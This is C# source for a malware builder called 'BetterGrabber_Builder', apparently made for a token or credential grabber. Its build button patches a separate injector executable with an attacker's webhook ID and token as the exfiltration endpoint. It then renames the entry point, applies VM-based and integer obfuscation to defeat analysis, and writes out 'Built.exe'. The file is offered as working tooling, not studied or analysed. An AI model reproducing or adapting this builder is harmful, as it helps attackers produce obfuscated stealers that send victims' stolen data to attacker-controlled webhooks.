using dnlib.DotNet;
using dnlib.DotNet.Emit;
using dnlib.DotNet.Writer;
using System;
using System.Data;
using System.Linq;
using System.Windows.Forms;

namespace BetterGrabber_Builder
{
    public partial class Form1 : Form
    {
        private void BetterGrabber_Builder_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                NativeStuff.ReleaseCapture();
                NativeStuff.SendMessage(Handle, NativeStuff.WM_NCLBUTTONDOWN, NativeStuff.HT_CAPTION, 0);
            }
        }
        public Form1()
        {
            InitializeComponent();
            this.MouseDown += BetterGrabber_Builder_MouseDown;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            ModuleDefMD Module = ModuleDefMD.Load("BetterGrabber_Injector.exe");

            foreach (TypeDef type in Module.Types)
                foreach (MethodDef method in type.Methods.Where(x => x.HasBody && x.Body.HasInstructions))
                    for (int i = 0; i < method.Body.Instructions.Count(); i++)
                        if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                            if (method.Body.Instructions[i].Operand.ToString().Contains("/YourWebhookID/YourWebhookTOKEN"))
                                method.Body.Instructions[i].Operand = String.Format("/api/webhooks/{0}/{1}", textBox1.Text, textBox2.Text);
            Module.EntryPoint.Name = "HideakiAtsuyo";

            //JustForFun.StringsLmao.Execute(Module, new string[] { "FindBytes", "ReplaceBytes" }); //Should I Solve It ?
            new FVM.Protections.VM.DynamicMethods().Execute(Module, new string[] { "FindBytes", "ReplaceBytes" });
            JustForFun.IntsLmao.Execute(Module, new string[] { "FindBytes", "ReplaceBytes" });

            var globalTypeCctor = Module.GlobalType.FindOrCreateStaticConstructor();
            int last = globalTypeCctor.Body.Instructions.Count - 1, globalTypeCctorIC = globalTypeCctor.Body.Instructions.Count;
            for (int i = 0; i < globalTypeCctorIC; i++)
            {
                if (i != last && globalTypeCctor.Body.Instructions[i].OpCode == OpCodes.Ret)
                    globalTypeCctor.Body.Instructions.RemoveAt(i);
                if (globalTypeCctor.Body.Instructions[last].OpCode != OpCodes.Ret)
                    globalTypeCctor.Body.Instructions.Add(Instruction.Create(OpCodes.Ret));

            }

            ModuleWriterOptions options = new ModuleWriterOptions(Module);
            options.Logger = DummyLogger.NoThrowInstance;
            options.MetadataOptions.Flags = MetadataFlags.PreserveAll;

            Module.Write("Built.exe", options);
        }
    }
}
